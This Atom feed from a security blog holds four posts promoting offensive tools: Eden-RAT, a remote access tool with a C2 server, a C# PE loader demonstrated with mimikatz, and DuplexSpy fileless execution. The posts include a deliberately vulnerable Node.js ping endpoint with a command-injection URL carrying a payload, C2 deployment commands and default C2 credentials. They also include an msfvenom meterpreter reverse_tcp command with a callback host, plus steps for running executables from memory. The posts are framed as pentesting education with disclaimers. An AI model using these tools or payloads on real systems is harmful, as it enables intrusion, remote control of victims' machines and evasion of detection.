<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iss4cf0ng/ISSAC&#39;s blog</title>
  
  <subtitle>CyberSecurity blog</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2026-02-13T09:19:18.612Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ISSAC</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Eden-RAT] How to Use Eden-RAT During the Early Stage of Penetration Testing</title>
    <link href="http://example.com/2026/02/09/2026-2-9-EdenPentestInitialStage/"/>
    <id>http://example.com/2026/02/09/2026-2-9-EdenPentestInitialStage/</id>
    <published>2026-02-09T08:54:33.000Z</published>
    <updated>2026-02-13T09:19:18.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article shows how to use <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-ToolEdenRAT/">Eden-RAT</a> in the early stage of penetration testing.</p><p>Github Repository: <a href="https://github.com/iss4cf0ng/Eden-RAT/">https://github.com/iss4cf0ng/Eden-RAT/</a></p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/overall.png'><img src="/images/article/tools/eden/init_stage/overall.png" width="1000"></p><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed out of personal interest in cybersecurity research and education.<br>It must <strong>not</strong> be used for illegal or unauthorized activities.<br>The author is not responsible for any misuse or damage caused by this software.</p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>The following table describes the experimental environment:</p><div class="table-container"><table><thead><tr><th>Host</th><th>OS</th><th>Description</th></tr></thead><tbody><tr><td>172.23.243.133</td><td>WSL</td><td>Eden-Server (C2 server)</td></tr><tr><td>192.168.1.131:3000</td><td>Ubuntu x64</td><td>Linux server with an RCE vulnerability</td></tr><tr><td>192.168.1.125</td><td>Windows 10</td><td>Eden-Client</td></tr></tbody></table></div><h3 id="Vulnerable-Machine"><a href="#Vulnerable-Machine" class="headerlink" title="Vulnerable Machine"></a>Vulnerable Machine</h3><p>In this demonstration, I deployed an Linux server with a simple RCE vulnerability. The server runs a <strong>Node.js</strong> web service.</p><p>Below is the Node.js code that contains the RCE vulnerability:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//app.js<br>const express = require(&quot;express&quot;);<br>const &#123; exec &#125; = require(&quot;child_process&quot;);<br><br>const app = express();<br>const PORT = 3000;<br><br>app.get(&quot;/ping&quot;, (req, res) =&gt; &#123;<br>  const host = req.query.host;<br><br>  if (!host) &#123;<br>    return res.send(`<br>      &lt;h2&gt;Ping a host&lt;/h2&gt;<br>      &lt;form&gt;<br>        &lt;input name=&quot;host&quot; placeholder=&quot;Enter host&quot; /&gt;<br>        &lt;button type=&quot;submit&quot;&gt;Ping&lt;/button&gt;<br>      &lt;/form&gt;<br>    `);<br>  &#125;<br><br>  exec(`ping -c 1 $&#123;host&#125;`, (error, stdout, stderr) =&gt; &#123;<br>    if (error) &#123;<br>      return res.send(`&lt;pre&gt;$&#123;stderr&#125;&lt;/pre&gt;`);<br>    &#125;<br>    res.send(`&lt;pre&gt;$&#123;stdout&#125;&lt;/pre&gt;`);<br>  &#125;);<br>&#125;);<br><br>app.listen(PORT, () =&gt; &#123;<br>  console.log(`Server running at http://localhost:$&#123;PORT&#125;`);<br>&#125;);<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/1.png'><img src="/images/article/tools/eden/init_stage/1.png" width="700"></p><p>This web application provides a ping feature used to test network connectivity or resolve domain names.<br>The nutshell of this feature is executing a Linux command. An RCE vulnerability can occur if a malicious user appends a semicolon (<code>;</code>) followed by arbitrary Linux commands to the host parameter:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/2.png'><img src="/images/article/tools/eden/init_stage/2.png" width="700"></p><p>Again, this is a very simple demonstration of RCE vulnerability. In real-world scenarios, RCE vulnerabilities are not always straightforward——just as buffer overflows in operating systems are often more complex. However, for educational purpose, simple is the best!</p><p>Now, let’s try to exploit this vulnerability using Eden-RAT.</p><h2 id="Deploy-Eden-C2-Server"><a href="#Deploy-Eden-C2-Server" class="headerlink" title="Deploy Eden C2 Server"></a>Deploy Eden C2 Server</h2><p>If you want to know how to deploy your Eden-Server and Eden-Client, please <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-ToolEdenRAT/#Deploy-Eden-C2-Server">click here</a>.</p><h2 id="Generate-a-payload"><a href="#Generate-a-payload" class="headerlink" title="Generate a payload"></a>Generate a payload</h2><p>Both the encryption and decryption mechanisms are implemented natively (pure implementation).<br>This means the target platform does not require any third-party libraries.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/3.png'><img src="/images/article/tools/eden/init_stage/3.png" width="300"></p><p>If the payload is generated successfully, Eden-RAT will display the raw payload code,<br>Next, switch the combo box selection to <code>Command</code>, then click <code>Copy</code>:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/7.png'><img src="/images/article/tools/eden/init_stage/7.png" width="700"></p><p>Before exploitation, don’t forget to URL-encode the payload!</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/4.png'><img src="/images/article/tools/eden/init_stage/4.png" width="700"></p><p>Now, let’s proceed with the RCE exploitation:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/ping?host=github.com;python3%20-c%20............(Your payload)<br></code></pre></td></tr></table></figure></p><p>Once the target Linux machine is online, we can execute interactive commands through the virtual terminal:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/5.png'><img src="/images/article/tools/eden/init_stage/5.png" width="800"></p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/6.png'><img src="/images/article/tools/eden/init_stage/6.png" width="800"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/tea_party.gif'><img src="/images/meme/tea_party.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article shows how to use </summary>
      
    
    
    
    <category term="Tools&#92;Eden-RAT" scheme="http://example.com/categories/Tools-Eden-RAT/"/>
    
    
    <category term="Penetration" scheme="http://example.com/tags/Penetration/"/>
    
    <category term="Pentesting" scheme="http://example.com/tags/Pentesting/"/>
    
    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
    
    <category term="Eden-RAT" scheme="http://example.com/tags/Eden-RAT/"/>
    
  </entry>
  
  <entry>
    <title>[Tool] Eden-RAT——A lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing</title>
    <link href="http://example.com/2026/02/09/2026-2-9-ToolEdenRAT/"/>
    <id>http://example.com/2026/02/09/2026-2-9-ToolEdenRAT/</id>
    <published>2026-02-09T08:53:54.000Z</published>
    <updated>2026-02-13T12:11:57.054Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>While developing <a href="https://github.com/iss4cf0ng/EgoDrop/">EgoDrop</a> and <a href="https://github.com/iss4cf0ng/DuplexSpyCS/">DuplexSpy</a>. I successfully implemented an interactive shell within a C#-based GUI application. I then recalled one of my earlier projects that had been suspended due to my limited development experience at the time. Therefore, I decided to revisit and complete it.</p><p>The idea of this project originated when I was learning web penetration testing.<br>When discovering an RCE (Remote Code/Command Execution) vulnerability, we usually demonstrate it with simple Linux commands(e.g., <code>id</code>, <code>whoami</code>, <code>ls</code>, <code>cat /etc/passwd</code>), and that is often the end of the story. However, if we want to conduct further post-exploitation——such as pivoting into the internal network——we may rely on reverse shell tools like <code>metasploit</code>, <code>nc</code> or <code>openssl</code>. Although they are powerful and widely used, they still have certain limitations in practical penetration testing scenario.<br>Therefore, I decided to develop a GUI-based remote access tool which can be leveraged after achieving RCE, establishing a robust and secure channel with an interactive shell and file manager.</p><p>Developing and maintaining this tool entirely on my own is challenging due to limited time, resources, and experience. As a result, the project may still contain undiscovered defects or design flaws. If you encounter any issues while using this tool, please feel free to open an issue or contact me.</p><p>If you find this tool informative or helpful, a star ⭐ will be greatly appreciated. </p><p>If you are interested in a demonstration of exploitation, please <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-EdenPentestInitialStage/">click here</a>.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Eden-RAT is a lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing.<br>It provides a Graphical User Interface (GUI) with multiple features targeting Linux systems, including a file manager and an interactive shell.</p><p>The interactive shell enables full command execution, allowing users to run commands such as <code>ssh</code>, <code>apt</code>, <code>pip install</code>, <code>vim</code>, and other interactive programs seamlessly.</p><p>Github Repository: <a href="https://github.com/iss4cf0ng/Eden-RAT/">https://github.com/iss4cf0ng/Eden-RAT/</a></p><h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><ul><li>Eden<ul><li>Build Payload</li><li>Multi Listener</li><li>Encrypted Channels</li></ul></li><li>Infected Machine<ul><li>Information</li><li>File Manager<ul><li>Display Image</li><li>Edit</li><li>Copy</li><li>Move</li><li>Paste</li><li>Upload</li><li>Download</li><li>Rename</li><li>Datetime</li><li>WGET</li><li>Archive<ul><li>Compress</li><li>Extract</li></ul></li><li>New<ul><li>Folder</li><li>Text File</li></ul></li></ul></li><li>Process View</li><li>Service View</li><li>Connection<ul><li>Disconnect</li><li>Reconnect</li></ul></li></ul></li></ul><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed out of personal interest in cybersecurity research and education.<br>It must <strong>not</strong> be used for illegal or unauthorized activities.<br>The author is not responsible for any misuse or damage caused by this software.</p><h1 id="Technical-Overview"><a href="#Technical-Overview" class="headerlink" title="Technical Overview"></a>Technical Overview</h1><p>Eden-RAT supprots encrypted communication using either AES/RSA hybrid encryption or TLS.</p><p>The AES pure implementation is adapted from:<br><a href="https://github.com/bozhu/AES-Python">https://github.com/bozhu/AES-Python</a></p><p>Once a payload successfully connects to the Eden server, it dynamically loads additional modules delivered by the server. These modules are executed via <code>exec()</code> and their class instances are registered within an internal dictionary-based class registry.</p><p>The overall architecture is illustrated below:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/technical.png'><img src="/images/article/tools/eden/main/technical.png" width="700"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><p>Eden-RAT consists of three components——Eden-Server, Eden-Client and the payload. </p><p>The overall architecture is shown as below:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/architecture.png'><img src="/images/article/tools/eden/main/architecture.png" width="1000"></p><p>All communication channels are point-to-point encrypted. The communication channel between the Eden-Server and the Eden-Client is encrypted using AES+RSA, while a channel between the Eden-Server and the target Linux server is encrypted using either AES+RSA or TLS.</p><h2 id="Eden-Server"><a href="#Eden-Server" class="headerlink" title="Eden-Server"></a>Eden-Server</h2><p>An Eden-Server is a python-based socket server. It provides multiple listeners for accepting and handling socket session from <strong>Eden-Clients</strong> and target Linux servers. It forwards messages between infected Linux systems and Eden-Clients, and processes tasks such as <strong>adding listener</strong>, <strong>building payload</strong> requested by Eden-Clients. </p><p>Note that an Eden-Server requires <code>pycryptodome</code>.</p><p>Available argument:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/server/1.png'><img src="/images/article/tools/eden/server/1.png" width="700"></p><h2 id="Eden-Client"><a href="#Eden-Client" class="headerlink" title="Eden-Client"></a>Eden-Client</h2><p>An Eden-Client is a C2 user who performs exploitation. All the tasks can only be processed after the Eden-Client connects to an Eden-Server.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/4.png'><img src="/images/article/tools/eden/main/4.png" width="700"></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>A payload is a script which is used for exploitation. <strong>All cryptographic algorithms implemented in the payload are written natively</strong>. It means the target Linux server doesn’t requires any third-party libraries (such as <code>pycryptodome</code>), but only a compatible runtime environment (e.g., python 3.10).</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/info/1.png'><img src="/images/article/tools/eden/info/1.png" width="700"></p><h2 id="File-Manager"><a href="#File-Manager" class="headerlink" title="File Manager"></a>File Manager</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/file/1.png'><img src="/images/article/tools/eden/file/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/eden/file/2.png'><img src="/images/article/tools/eden/file/2.png" width="700"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/6.png'><img src="/images/article/tools/eden/init_stage/6.png" width="700"></p><h2 id="Process-View"><a href="#Process-View" class="headerlink" title="Process View"></a>Process View</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/process/1.png'><img src="/images/article/tools/eden/process/1.png" width="700"></p><h2 id="Service-View"><a href="#Service-View" class="headerlink" title="Service View"></a>Service View</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/service/1.png'><img src="/images/article/tools/eden/service/1.png" width="700"></p><h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><h2 id="Deploy-Eden-C2-Server"><a href="#Deploy-Eden-C2-Server" class="headerlink" title="Deploy Eden C2 Server"></a>Deploy Eden C2 Server</h2><p>Before starting the C2 server, you need to install <code>pycryptodome</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pip3 install pycryptodome<br></code></pre></td></tr></table></figure></p><p>After installing the package, <strong>you must generate an SSL private key and certificate:</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes<br></code></pre></td></tr></table></figure><br>Make sure the files are named exactly:</p><ul><li><code>key.pem</code></li><li><code>cert.pem</code></li></ul><p>Finally, start the C2 server:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 eden_server.py -lvvp 4444<br></code></pre></td></tr></table></figure></p><p>Our Eden-Server has been deployed.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/server/1.png'><img src="/images/article/tools/eden/server/1.png" width="700"></p><h2 id="Start-Eden-Client-and-Connect-to-the-C2-Server"><a href="#Start-Eden-Client-and-Connect-to-the-C2-Server" class="headerlink" title="Start Eden Client and Connect to the C2 Server"></a>Start Eden Client and Connect to the C2 Server</h2><p>The default C2 user’s credential are:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username = sdksdk<br>password = 123456<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/2.png'><img src="/images/article/tools/eden/main/2.png" width="400"></p><p>After logging in successfully, you should see the following message box:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/3.png'><img src="/images/article/tools/eden/main/3.png" width="500"></p><h2 id="Add-Delete-a-C2-User"><a href="#Add-Delete-a-C2-User" class="headerlink" title="Add/Delete a C2 User"></a>Add/Delete a C2 User</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 eden_server.py --db<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/eden/user/1.png'><img src="/images/article/tools/eden/user/1.png" width="700"></p><p>Note that your input of password is invisible, which is expected.</p><h2 id="Generate-a-payload"><a href="#Generate-a-payload" class="headerlink" title="Generate a payload"></a>Generate a payload</h2><p>Both the encryption and decryption mechanisms are implemented natively (pure implementation).<br>This means the target platform does not require any third-party libraries.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/3.png'><img src="/images/article/tools/eden/init_stage/3.png" width="300"></p><h2 id="Infection"><a href="#Infection" class="headerlink" title="Infection"></a>Infection</h2><p>You can run the payload script directly:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 payload.py<br></code></pre></td></tr></table></figure></p><p>You can also execute the payload after achieving RCE. If you are interested in a demonstration of exploitation, please <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-EdenPentestInitialStage/">click here</a>.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/tea_party.gif'><img src="/images/meme/tea_party.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Preface&quot;&gt;&lt;a href=&quot;#Preface&quot; class=&quot;headerlink&quot; title=&quot;Preface&quot;&gt;&lt;/a&gt;Preface&lt;/h1&gt;&lt;p&gt;While developing &lt;a href=&quot;https://github.com/iss4c</summary>
      
    
    
    
    <category term="Tools&#92;Eden-RAT" scheme="http://example.com/categories/Tools-Eden-RAT/"/>
    
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="RAT" scheme="http://example.com/tags/RAT/"/>
    
    <category term="Pentesting" scheme="http://example.com/tags/Pentesting/"/>
    
    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
    
    <category term="Eden-RAT" scheme="http://example.com/tags/Eden-RAT/"/>
    
    <category term="Remote Access Tool" scheme="http://example.com/tags/Remote-Access-Tool/"/>
    
  </entry>
  
  <entry>
    <title>[Tools] dotNetPELoader——A C# PE loader for x64 and x86 PE files.</title>
    <link href="http://example.com/2026/02/06/2026-2-6-ToolDotNetPELoader/"/>
    <id>http://example.com/2026/02/06/2026-2-6-ToolDotNetPELoader/</id>
    <published>2026-02-06T14:33:48.000Z</published>
    <updated>2026-02-13T08:36:39.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Recently, when I was developing a fileless execution method for <a href="https://github.com/iss4cf0ng/DuplexSpyCS">DuplexSpy RAT</a> version 2, I could hardly find a C#-based x86 PE loader.<br>Most existing implementations I found were x64-only, such as the one developed by <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a></p><p align="center" class='item-img' data-src='/images/meme/mika_neko.png'><img src="/images/meme/mika_neko.png" width="300"></p><p>Therefore, I decided to develop a C#-based x86 PE loader myself.</p><p>This console application allows you to load either x86 or x64 PE files into memory.<br>First, it reads the file bytes from the specified file path, then determines the architecture of both the loader and the target PE file.</p><p>An x64 PE cannot be loaded by an x86 loader, and vice versa.</p><p>View the GitHub repository <a href="https://github.com/iss4cf0ng/dotNetPELoader">here</a>  </p><h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><ul><li>Load <strong>x86 PE in x86 process</strong></li><li>Load <strong>x64 PE in x64 process</strong></li><li>Handles relocation and import resolving</li><li>Fully written in C#</li></ul><p>If you find this project useful, a ⭐ would be appreciated.</p><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/meme/mika_cute.jpg'><img src="https://iss4cf0ng.github.io/images/meme/mika_cute.jpg" width="200"></p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x64 x64_file.exe<br>dotNetPELoader.exe --x86 x86_file.exe<br>dotNetPELoader.exe --coffee<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/hello.png'><img src="/images/article/tools/dotNetPELoader/hello.png" width="600"></p><h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><h2 id="x64-mimikatz"><a href="#x64-mimikatz" class="headerlink" title="x64 - mimikatz"></a>x64 - mimikatz</h2><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/anycpu.png'><img src="/images/article/tools/dotNetPELoader/anycpu.png" width="600"></p><p>If you try to load an x86 PE while the loader is an x64 loader, an exception will be thrown:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x64 mimikatz<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.1.png'><img src="/images/article/tools/dotNetPELoader/x64.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.2.png'><img src="/images/article/tools/dotNetPELoader/x64.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.3.png'><img src="/images/article/tools/dotNetPELoader/x64.3.png" width="600"></p><h2 id="x86-mimikatz"><a href="#x86-mimikatz" class="headerlink" title="x86 - mimikatz"></a>x86 - mimikatz</h2><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86_cpu.png'><img src="/images/article/tools/dotNetPELoader/x86_cpu.png" width="600"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x86 mimikatz<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86.1.png'><img src="/images/article/tools/dotNetPELoader/x86.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86.2.png'><img src="/images/article/tools/dotNetPELoader/x86.2.png" width="600"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/rio_pc.jpg'><img src="/images/meme/rio_pc.jpg" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Recently, when I was developin</summary>
      
    
    
    
    <category term="Tools&#92;dotNetPELoader" scheme="http://example.com/categories/Tools-dotNetPELoader/"/>
    
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="Fileless Execution" scheme="http://example.com/tags/Fileless-Execution/"/>
    
    <category term="PE Loader" scheme="http://example.com/tags/PE-Loader/"/>
    
    <category term="PE File" scheme="http://example.com/tags/PE-File/"/>
    
    <category term="x86" scheme="http://example.com/tags/x86/"/>
    
    <category term="x64" scheme="http://example.com/tags/x64/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] Fileless Execution</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyFilelessExec/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyFilelessExec/</id>
    <published>2026-02-03T15:42:02.000Z</published>
    <updated>2026-02-13T08:36:59.885Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the <strong>Fileless Execution</strong> feature of DuplexSpy.</p><p>This feature allows you to execute a PE (Portable Executable) file on a compromised machine without writing it to disk.</p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends raw PE file bytes to the compromised machine. The DuplexSpy payload loads these PE bytes into memory and executes them. When the payload receives a fileless execution command, it creates a new process to execute the PE entirely from memory.</p><p>The figure below illustrates the execution flow:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/procedure.svg'><img src="/images/article/tools/duplexspy/fileless/procedure.svg" width="1000"></p><p>The x64 version of PE loader is based on the implementation by <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a>. However, I have developed the <a href="https://github.com/iss4cf0ng/dotNetPELoader">x86 version</a> in case the C# payload uses the x86 platform.</p><p>Note that a loader can only execute PE files that match its architecture. An x64 loader cannot execute x86 PE files and vice versa. Make sure you identify the architecture of the target PE and select the matched loader.</p><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="300"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Example-1-x64-msfvenom"><a href="#Example-1-x64-msfvenom" class="headerlink" title="Example 1 - x64 msfvenom"></a>Example 1 - x64 msfvenom</h2><p>First, check the architecture of the executed payload:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.1.png'><img src="/images/article/tools/duplexspy/fileless/check.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.2.png'><img src="/images/article/tools/duplexspy/fileless/check.2.png" width="700"></p><p>Generate an x64 Messagebox payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/x64/messagebox TEXT=&quot;msf hello world&quot; -f exe &gt; x64.exe<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.1.png'><img src="/images/article/tools/duplexspy/fileless/msf.1.png" width="700"></p><p>The <code>x64.exe</code> is executed successfully without being written to disk. This is fileless execution. Next, check the process list:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist | find &quot;client.exe&quot;<br></code></pre></td></tr></table></figure><p>Here <code>client.exe</code> is your DuplexSpy payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.2.png'><img src="/images/article/tools/duplexspy/fileless/msf.2.png" width="700"></p><p>Two instance of <code>client.exe</code> (the DuplexSpy payload) are running. One instance maintains communication with the C2 server, while the other is for executing the filesless payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.3.png'><img src="/images/article/tools/duplexspy/fileless/msf.3.png" width="700"></p><h2 id="Example-2-x86-meterpreter"><a href="#Example-2-x86-meterpreter" class="headerlink" title="Example 2 - x86 meterpreter"></a>Example 2 - x86 meterpreter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 lhost=192.168.1.192 lport=4444 -f exe -a x86 &gt; x86.exe<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.4.png'><img src="/images/article/tools/duplexspy/fileless/msf.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.5.png'><img src="/images/article/tools/duplexspy/fileless/msf.5.png" width="700"></p><h2 id="Example-3-x86-calc-exe"><a href="#Example-3-x86-calc-exe" class="headerlink" title="Example 3 - x86 calc.exe"></a>Example 3 - x86 calc.exe</h2><p>Now, try executing a more complex application:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/calc.1.png'><img src="/images/article/tools/duplexspy/fileless/calc.1.png" width="500"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="Tools&#92;DuplexSpy" scheme="http://example.com/categories/Tools-DuplexSpy/"/>
    
    
